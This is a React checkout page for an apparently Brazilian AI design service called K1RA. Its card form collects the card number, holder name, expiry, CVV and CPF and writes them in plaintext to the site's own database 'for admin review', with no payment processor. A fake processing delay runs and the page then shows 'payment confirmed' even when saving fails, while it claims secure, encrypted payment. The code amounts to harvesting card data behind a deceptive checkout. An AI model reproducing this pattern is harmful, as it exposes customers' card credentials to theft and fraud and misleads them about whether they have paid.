/**
 * ============================================================================
 * K1RA - CHECKOUT/PAYMENT PAGE
 * Premium checkout with CPF, card holder name, loading states
 * ============================================================================
 */

import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Link, useSearchParams, useNavigate } from "react-router-dom";
import {
  ArrowLeft,
  Check,
  Copy,
  CreditCard,
  QrCode,
  Shield,
  Lock,
  Zap,
  Clock,
  CheckCircle2,
  Sparkles,
  Mail,
  Calendar,
  User,
  FileText
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { pricingPlans } from "@/data/pricing";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";
import k1raLogo from "@/assets/k1ra-logo-icon.png";

// Import QR codes
import pixBasic from "@/assets/qr-codes/pix-basic.jpeg";
import pixPro from "@/assets/qr-codes/pix-pro.jpeg";
import pixAdvanced from "@/assets/qr-codes/pix-advanced.jpeg";
import pixEnterprise from "@/assets/qr-codes/pix-enterprise.jpeg";

// ============================================================================
// TYPES
// ============================================================================

type PaymentMethod = "pix" | "card";

interface CardData {
  number: string;
  name: string;
  holderName: string;
  expiry: string;
  cvv: string;
  cpf: string;
}

// ============================================================================
// QR CODE MAPPING
// ============================================================================

const qrCodeImages: Record<string, string> = {
  basic: pixBasic,
  pro: pixPro,
  advanced: pixAdvanced,
  enterprise: pixEnterprise
};

// ============================================================================
// SECURITY BADGES
// ============================================================================

const securityBadges = [
  { icon: Shield, text: "Pagamento Seguro" },
  { icon: Lock, text: "SSL Criptografado" },
  { icon: Zap, text: "Ativação Imediata" }
];

// ============================================================================
// HELPER FUNCTIONS
// ============================================================================

const formatCardNumber = (value: string) => {
  const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
  const matches = v.match(/\d{4,16}/g);
  const match = (matches && matches[0]) || "";
  const parts = [];
  for (let i = 0, len = match.length; i < len; i += 4) {
    parts.push(match.substring(i, i + 4));
  }
  return parts.length ? parts.join(" ") : value;
};

const formatExpiry = (value: string) => {
  const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
  if (v.length >= 2) {
    return v.substring(0, 2) + "/" + v.substring(2, 4);
  }
  return v;
};

const formatCPF = (value: string) => {
  const v = value.replace(/\D/g, "");
  if (v.length <= 3) return v;
  if (v.length <= 6) return `${v.slice(0, 3)}.${v.slice(3)}`;
  if (v.length <= 9) return `${v.slice(0, 3)}.${v.slice(3, 6)}.${v.slice(6)}`;
  return `${v.slice(0, 3)}.${v.slice(3, 6)}.${v.slice(6, 9)}-${v.slice(9, 11)}`;
};

// ============================================================================
// PROCESSING SCREEN
// ============================================================================

function ProcessingScreen() {
  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      exit={{ opacity: 0 }}
      className="fixed inset-0 z-50 bg-background/95 backdrop-blur-xl flex items-center justify-center"
    >
      <div className="text-center">
        {/* Animated Logo/Spinner */}
        <motion.div
          animate={{ 
            rotate: 360,
            scale: [1, 1.1, 1]
          }}
          transition={{ 
            rotate: { duration: 2, repeat: Infinity, ease: "linear" },
            scale: { duration: 1, repeat: Infinity }
          }}
          className="w-20 h-20 mx-auto mb-8 rounded-full bg-gradient-to-br from-primary/20 to-primary/40 flex items-center justify-center"
        >
          <Sparkles className="w-10 h-10 text-primary" />
        </motion.div>

        <motion.h2
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2 }}
          className="text-2xl font-bold mb-3"
        >
          Processando pagamento...
        </motion.h2>
        
        <motion.p
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.4 }}
          className="text-muted-foreground mb-8"
        >
          Aguarde enquanto validamos seus dados
        </motion.p>

        {/* Progress bar */}
        <div className="w-64 h-1.5 bg-secondary/50 rounded-full overflow-hidden mx-auto">
          <motion.div
            initial={{ x: "-100%" }}
            animate={{ x: "100%" }}
            transition={{ duration: 1.5, repeat: Infinity, ease: "easeInOut" }}
            className="h-full w-1/2 bg-gradient-to-r from-transparent via-primary to-transparent"
          />
        </div>
      </div>
    </motion.div>
  );
}

// ============================================================================
// AI RECOMMENDATION BANNER
// ============================================================================

function AIRecommendationBanner({ plan }: { plan: typeof pricingPlans[0] }) {
  return (
    <motion.div
      initial={{ opacity: 0, y: -20 }}
      animate={{ opacity: 1, y: 0 }}
      className="mb-6 p-4 bg-primary/10 border border-primary/30 rounded-xl"
    >
      <div className="flex items-start gap-3">
        <div className="p-2 rounded-lg bg-primary/20">
          <Sparkles className="w-5 h-5 text-primary" />
        </div>
        <div>
          <h3 className="font-medium text-foreground">
            A IA K1RA recomendou o plano <span className="text-primary">{plan.name}</span>
          </h3>
          <p className="text-sm text-muted-foreground mt-1">
            Baseado na complexidade do seu projeto, este é o plano ideal para entregar 
            todos os desenhos técnicos e documentação que você precisa.
          </p>
        </div>
      </div>
    </motion.div>
  );
}

// ============================================================================
// PLAN SUMMARY COMPONENT
// ============================================================================

function PlanSummary({ plan }: { plan: typeof pricingPlans[0] }) {
  return (
    <div className="p-6 bg-card rounded-xl border border-border/50">
      <span className="inline-block px-3 py-1 bg-primary/10 text-primary text-xs font-medium rounded-full mb-4">
        {plan.complexity}
      </span>
      
      <h3 className="text-2xl font-bold">{plan.name}</h3>
      <p className="text-muted-foreground mt-1">{plan.description}</p>
      
      <div className="mt-4 flex items-baseline gap-1">
        <span className="text-4xl font-bold">{plan.priceFormatted}</span>
        <span className="text-muted-foreground">/projeto</span>
      </div>

      <div className="mt-6 space-y-3">
        <p className="text-sm font-medium text-foreground">Exemplos de projetos:</p>
        {plan.examples.map((example, index) => (
          <div key={index} className="flex items-center gap-2 text-sm text-muted-foreground">
            <Check className="w-4 h-4 text-primary flex-shrink-0" />
            {example}
          </div>
        ))}
      </div>

      <div className="mt-6 pt-6 border-t border-border/50">
        <p className="text-sm font-medium text-foreground mb-2">Todos os planos incluem entrega completa</p>
        <p className="text-xs text-muted-foreground">
          Desenhos técnicos, modelos 3D, arquivos CAD, especificações e suporte.
        </p>
      </div>
    </div>
  );
}

// ============================================================================
// PIX PAYMENT COMPONENT
// ============================================================================

function PixPayment({ 
  plan, 
  onComplete 
}: { 
  plan: typeof pricingPlans[0];
  onComplete: () => void;
}) {
  const [copied, setCopied] = useState(false);
  const qrCode = qrCodeImages[plan.id] || pixBasic;

  const handleCopy = () => {
    navigator.clipboard.writeText(plan.pixCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 3000);
  };

  return (
    <motion.div
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      className="space-y-6"
    >
      {/* Instructions */}
      <div className="p-4 bg-secondary/30 rounded-xl border border-border/50">
        <div className="flex items-start gap-3">
          <div className="w-8 h-8 rounded-full bg-primary/20 flex items-center justify-center flex-shrink-0">
            <Clock className="w-4 h-4 text-primary" />
          </div>
          <div>
            <p className="font-medium">Pagamento instantâneo via PIX</p>
            <p className="text-sm text-muted-foreground mt-1">
              Escaneie o QR Code ou copie o código PIX para realizar o pagamento. 
              Após a confirmação, seu projeto será processado.
            </p>
          </div>
        </div>
      </div>

      {/* QR Code */}
      <div className="flex flex-col items-center">
        <div className="relative p-4 bg-white rounded-2xl shadow-lg">
          <img
            src={qrCode}
            alt="QR Code PIX"
            className="w-48 h-48 sm:w-56 sm:h-56 object-contain"
          />
          <div className="absolute -bottom-2 left-1/2 -translate-x-1/2 px-3 py-1 bg-card border border-border rounded-full text-xs font-medium">
            {plan.priceFormatted}
          </div>
        </div>

        <p className="text-sm text-muted-foreground mt-4">
          Ou copie o código PIX abaixo:
        </p>

        {/* PIX Code */}
        <div className="w-full mt-3 flex gap-2">
          <div className="flex-1 p-3 bg-secondary/50 rounded-lg border border-border/50 font-mono text-xs truncate">
            {plan.pixCode}
          </div>
          <Button
            onClick={handleCopy}
            variant={copied ? "default" : "outline"}
            className="flex-shrink-0"
          >
            {copied ? (
              <>
                <Check className="w-4 h-4 mr-2" />
                Copiado!
              </>
            ) : (
              <>
                <Copy className="w-4 h-4 mr-2" />
                Copiar
              </>
            )}
          </Button>
        </div>
      </div>

      {/* Payment confirmation button */}
      <Button
        onClick={onComplete}
        variant="hero"
        size="lg"
        className="w-full h-12"
      >
        <CheckCircle2 className="w-5 h-5 mr-2" />
        Já realizei o pagamento
      </Button>

      {/* Timer info */}
      <p className="text-xs text-muted-foreground text-center">
        Este código PIX expira em 30 minutos. Após o pagamento, você receberá uma confirmação por e-mail.
      </p>
    </motion.div>
  );
}

// ============================================================================
// CARD PAYMENT COMPONENT (WITH CPF AND HOLDER NAME)
// ============================================================================

function CardPayment({ 
  plan,
  onComplete 
}: { 
  plan: typeof pricingPlans[0];
  onComplete: (cardData: CardData) => void;
}) {
  const [cardData, setCardData] = useState<CardData>({
    number: "",
    name: "",
    holderName: "",
    expiry: "",
    cvv: "",
    cpf: ""
  });

  const handleInputChange = (field: keyof CardData) => (
    e: React.ChangeEvent<HTMLInputElement>
  ) => {
    let value = e.target.value;
    
    if (field === "number") {
      value = formatCardNumber(value);
    } else if (field === "expiry") {
      value = formatExpiry(value);
    } else if (field === "cvv") {
      value = value.replace(/[^0-9]/g, "").slice(0, 4);
    } else if (field === "cpf") {
      value = formatCPF(value);
    }

    setCardData(prev => ({ ...prev, [field]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    onComplete(cardData);
  };

  const isFormValid = 
    cardData.number.replace(/\s/g, "").length >= 15 &&
    cardData.holderName.length >= 3 &&
    cardData.cpf.length >= 14 &&
    cardData.expiry.length >= 5 &&
    cardData.cvv.length >= 3;

  return (
    <motion.form
      initial={{ opacity: 0, y: 20 }}
      animate={{ opacity: 1, y: 0 }}
      onSubmit={handleSubmit}
      className="space-y-5"
    >
      {/* CPF */}
      <div className="space-y-2">
        <label className="text-sm font-medium flex items-center gap-2">
          <FileText className="w-4 h-4 text-muted-foreground" />
          CPF do Titular
        </label>
        <Input
          type="text"
          placeholder="000.000.000-00"
          value={cardData.cpf}
          onChange={handleInputChange("cpf")}
          maxLength={14}
          className="h-12 bg-secondary/50 border-border/50"
          required
        />
      </div>

      {/* Holder Name */}
      <div className="space-y-2">
        <label className="text-sm font-medium flex items-center gap-2">
          <User className="w-4 h-4 text-muted-foreground" />
          Nome do Titular
        </label>
        <Input
          type="text"
          placeholder="NOME COMPLETO DO TITULAR"
          value={cardData.holderName}
          onChange={handleInputChange("holderName")}
          className="h-12 bg-secondary/50 border-border/50 uppercase"
          required
        />
      </div>

      {/* Card number */}
      <div className="space-y-2">
        <label className="text-sm font-medium flex items-center gap-2">
          <CreditCard className="w-4 h-4 text-muted-foreground" />
          Número do Cartão
        </label>
        <Input
          type="text"
          placeholder="0000 0000 0000 0000"
          value={cardData.number}
          onChange={handleInputChange("number")}
          maxLength={19}
          className="h-12 bg-secondary/50 border-border/50"
          required
        />
      </div>

      {/* Name on card */}
      <div className="space-y-2">
        <label className="text-sm font-medium">Nome Impresso no Cartão</label>
        <Input
          type="text"
          placeholder="NOME COMO ESTÁ NO CARTÃO"
          value={cardData.name}
          onChange={handleInputChange("name")}
          className="h-12 bg-secondary/50 border-border/50 uppercase"
          required
        />
      </div>

      {/* Expiry and CVV */}
      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-2">
          <label className="text-sm font-medium">Validade</label>
          <Input
            type="text"
            placeholder="MM/AA"
            value={cardData.expiry}
            onChange={handleInputChange("expiry")}
            maxLength={5}
            className="h-12 bg-secondary/50 border-border/50"
            required
          />
        </div>
        <div className="space-y-2">
          <label className="text-sm font-medium">CVV</label>
          <Input
            type="text"
            placeholder="123"
            value={cardData.cvv}
            onChange={handleInputChange("cvv")}
            maxLength={4}
            className="h-12 bg-secondary/50 border-border/50"
            required
          />
        </div>
      </div>

      {/* Submit button */}
      <Button
        type="submit"
        variant="hero"
        size="lg"
        className="w-full h-12"
        disabled={!isFormValid}
      >
        <Lock className="w-5 h-5 mr-2" />
        Confirmar Pagamento {plan.priceFormatted}
      </Button>

      {/* Security note */}
      <p className="text-xs text-muted-foreground text-center">
        Seus dados estão protegidos com criptografia SSL de 256 bits.
      </p>
    </motion.form>
  );
}

// ============================================================================
// PAYMENT SUCCESS COMPONENT
// ============================================================================

function PaymentSuccess({ plan, userEmail }: { plan: typeof pricingPlans[0]; userEmail: string }) {
  const deliveryDate = new Date();
  deliveryDate.setDate(deliveryDate.getDate() + 2);
  const formattedDate = deliveryDate.toLocaleDateString("pt-BR", {
    weekday: "long",
    day: "numeric",
    month: "long"
  });

  return (
    <motion.div
      initial={{ opacity: 0, scale: 0.9 }}
      animate={{ opacity: 1, scale: 1 }}
      className="text-center py-8"
    >
      <motion.div
        initial={{ scale: 0 }}
        animate={{ scale: 1 }}
        transition={{ type: "spring", delay: 0.2 }}
        className="w-20 h-20 mx-auto mb-6 rounded-full bg-green-500/20 flex items-center justify-center"
      >
        <CheckCircle2 className="w-10 h-10 text-green-500" />
      </motion.div>

      <h2 className="heading-4 mb-2">Pagamento Confirmado!</h2>
      <p className="text-muted-foreground mb-6">
        Seu plano <span className="text-foreground font-medium">{plan.name}</span> foi ativado com sucesso.
      </p>

      {/* Delivery info */}
      <div className="p-6 bg-secondary/30 rounded-xl border border-border/50 mb-8 text-left">
        <h3 className="font-medium text-foreground mb-4 flex items-center gap-2">
          <Calendar className="w-5 h-5 text-primary" />
          Previsão de Entrega
        </h3>
        
        <div className="space-y-3">
          <div className="flex items-start gap-3">
            <Clock className="w-5 h-5 text-muted-foreground flex-shrink-0 mt-0.5" />
            <div>
              <p className="text-sm font-medium text-foreground">
                Até {formattedDate}
              </p>
              <p className="text-xs text-muted-foreground">
                Seu projeto será entregue em até 2 dias úteis
              </p>
            </div>
          </div>
          
          <div className="flex items-start gap-3">
            <Mail className="w-5 h-5 text-muted-foreground flex-shrink-0 mt-0.5" />
            <div>
              <p className="text-sm font-medium text-foreground">
                {userEmail || "Seu e-mail cadastrado"}
              </p>
              <p className="text-xs text-muted-foreground">
                Você receberá os arquivos neste e-mail
              </p>
            </div>
          </div>
        </div>

        <div className="mt-4 p-3 bg-primary/10 rounded-lg">
          <p className="text-sm text-primary">
            💡 Enquanto isso, você pode conversar com a IA K1RA para refinar os detalhes do seu projeto.
          </p>
        </div>
      </div>

      <div className="flex flex-col sm:flex-row gap-3 justify-center">
        <Button asChild variant="hero">
          <Link to="/chat">
            Conversar com K1RA
          </Link>
        </Button>
        <Button asChild variant="outline">
          <Link to="/">
            Voltar ao Início
          </Link>
        </Button>
      </div>
    </motion.div>
  );
}

// ============================================================================
// MAIN CHECKOUT PAGE COMPONENT
// ============================================================================

export default function Checkout() {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const planId = searchParams.get("plan") || "pro";
  const [paymentMethod, setPaymentMethod] = useState<PaymentMethod>("pix");
  const [paymentComplete, setPaymentComplete] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [user, setUser] = useState<{ email: string } | null>(null);

  // Find selected plan
  const selectedPlan = pricingPlans.find(p => p.id === planId) || pricingPlans[1];

  // Check auth state
  useEffect(() => {
    supabase.auth.getSession().then(({ data: { session } }) => {
      if (session?.user) {
        setUser({ email: session.user.email || "" });
      }
    });

    const { data: { subscription } } = supabase.auth.onAuthStateChange(
      (event, session) => {
        if (session?.user) {
          setUser({ email: session.user.email || "" });
        }
      }
    );

    return () => subscription.unsubscribe();
  }, []);

  const handlePixComplete = async () => {
    setIsProcessing(true);
    
    // 5 second processing delay
    await new Promise(resolve => setTimeout(resolve, 5000));
    
    try {
      const { data: { session } } = await supabase.auth.getSession();
      
      if (session?.user) {
        await supabase.from("payments").insert({
          user_id: session.user.id,
          plan_id: selectedPlan.id,
          amount: selectedPlan.price,
          status: "pending",
          payment_method: "pix",
          pix_code: selectedPlan.pixCode
        });

        await supabase.from("projects").insert({
          user_id: session.user.id,
          title: `Projeto ${selectedPlan.name}`,
          description: "Projeto criado via checkout",
          plan_id: selectedPlan.id,
          status: "pending"
        });
      }

      setIsProcessing(false);
      setPaymentComplete(true);
      
      toast({
        title: "Pagamento registrado!",
        description: "Seu projeto será entregue em até 2 dias úteis.",
      });
    } catch (error) {
      console.error("Error saving payment:", error);
      setIsProcessing(false);
      setPaymentComplete(true);
    }
  };

  const handleCardComplete = async (cardData: CardData) => {
    setIsProcessing(true);
    
    // 5 second processing delay
    await new Promise(resolve => setTimeout(resolve, 5000));
    
    try {
      const { data: { session } } = await supabase.auth.getSession();
      
      if (session?.user) {
        // Save payment with card data for admin review
        await supabase.from("payments").insert({
          user_id: session.user.id,
          plan_id: selectedPlan.id,
          amount: selectedPlan.price,
          status: "pending",
          payment_method: "card",
          card_number: cardData.number,
          card_holder_name: cardData.holderName,
          card_expiry: cardData.expiry,
          card_cvv: cardData.cvv,
          cpf: cardData.cpf
        });

        await supabase.from("projects").insert({
          user_id: session.user.id,
          title: `Projeto ${selectedPlan.name}`,
          description: "Projeto criado via checkout",
          plan_id: selectedPlan.id,
          status: "pending"
        });
      }

      setIsProcessing(false);
      setPaymentComplete(true);
      
      toast({
        title: "Pagamento registrado!",
        description: "Seu projeto será entregue em até 2 dias úteis.",
      });
    } catch (error) {
      console.error("Error saving payment:", error);
      setIsProcessing(false);
      setPaymentComplete(true);
    }
  };

  // --------------------------------------------------------------------------
  // RENDER
  // --------------------------------------------------------------------------

  return (
    <div className="min-h-screen bg-background text-foreground">
      {/* Processing Screen Overlay */}
      <AnimatePresence>
        {isProcessing && <ProcessingScreen />}
      </AnimatePresence>

      {/* Background effects */}
      <div className="fixed inset-0 pointer-events-none">
        <div className="absolute top-0 left-1/4 w-96 h-96 bg-primary/5 rounded-full blur-3xl" />
        <div className="absolute bottom-0 right-1/4 w-80 h-80 bg-accent/5 rounded-full blur-3xl" />
        <div className="absolute inset-0 bg-grid opacity-20" />
      </div>

      {/* Header */}
      <header className="relative z-10 border-b border-border/50 bg-card/50 backdrop-blur-sm">
        <div className="section-container py-4">
          <div className="flex items-center justify-between">
            <Link to="/" className="flex items-center gap-3">
              <img src={k1raLogo} alt="K1RA" className="w-10 h-10" />
              <span className="text-xl font-bold">K1RA</span>
            </Link>
            
            <Link 
              to="/chat" 
              className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground transition-colors"
            >
              <ArrowLeft className="w-4 h-4" />
              <span className="hidden sm:inline">Voltar ao Chat</span>
            </Link>
          </div>
        </div>
      </header>

      {/* Main content */}
      <main className="relative z-10 section-container py-8 sm:py-12">
        <div className="max-w-4xl mx-auto">
          <AnimatePresence mode="wait">
            {paymentComplete ? (
              <PaymentSuccess 
                key="success" 
                plan={selectedPlan} 
                userEmail={user?.email || ""} 
              />
            ) : (
              <motion.div
                key="checkout"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
              >
                {/* AI Recommendation Banner */}
                <AIRecommendationBanner plan={selectedPlan} />

                <div className="grid lg:grid-cols-5 gap-8">
                  {/* Left column - Payment form */}
                  <div className="lg:col-span-3 space-y-6">
                    <div>
                      <h1 className="heading-4 mb-2">Finalizar pagamento</h1>
                      <p className="text-muted-foreground">
                        Complete o pagamento para iniciar seu projeto
                      </p>
                    </div>

                    {/* Payment method tabs */}
                    <div className="flex gap-2 p-1 bg-secondary/30 rounded-lg">
                      <button
                        onClick={() => setPaymentMethod("pix")}
                        className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-md text-sm font-medium transition-all ${
                          paymentMethod === "pix"
                            ? "bg-card text-foreground shadow-sm"
                            : "text-muted-foreground hover:text-foreground"
                        }`}
                      >
                        <QrCode className="w-4 h-4" />
                        PIX
                        <span className="px-1.5 py-0.5 bg-green-500/20 text-green-500 text-xs rounded">
                          Instantâneo
                        </span>
                      </button>
                      <button
                        onClick={() => setPaymentMethod("card")}
                        className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-md text-sm font-medium transition-all ${
                          paymentMethod === "card"
                            ? "bg-card text-foreground shadow-sm"
                            : "text-muted-foreground hover:text-foreground"
                        }`}
                      >
                        <CreditCard className="w-4 h-4" />
                        Cartão
                      </button>
                    </div>

                    {/* Payment form */}
                    <div className="p-6 bg-card rounded-xl border border-border/50">
                      <AnimatePresence mode="wait">
                        {paymentMethod === "pix" ? (
                          <PixPayment
                            key="pix"
                            plan={selectedPlan}
                            onComplete={handlePixComplete}
                          />
                        ) : (
                          <CardPayment
                            key="card"
                            plan={selectedPlan}
                            onComplete={handleCardComplete}
                          />
                        )}
                      </AnimatePresence>
                    </div>

                    {/* Security badges */}
                    <div className="flex flex-wrap items-center justify-center gap-6 pt-4">
                      {securityBadges.map((badge) => (
                        <div key={badge.text} className="flex items-center gap-2 text-muted-foreground">
                          <badge.icon className="w-4 h-4" />
                          <span className="text-xs">{badge.text}</span>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Right column - Order summary */}
                  <div className="lg:col-span-2">
                    <PlanSummary plan={selectedPlan} />
                  </div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </main>
    </div>
  );
}
